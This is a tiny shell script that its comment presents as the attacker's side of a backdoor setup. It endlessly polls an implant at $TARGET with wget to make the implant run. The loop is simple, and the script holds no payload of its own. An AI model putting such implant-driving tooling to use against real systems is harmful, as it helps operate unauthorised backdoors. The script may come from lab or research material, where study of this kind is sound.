#!/bin/sh
# The attacker's side: poll the implant on the unplanned port and make it work.
while true; do wget -q -O- "$TARGET" >/dev/null 2>&1; sleep 0.5; done
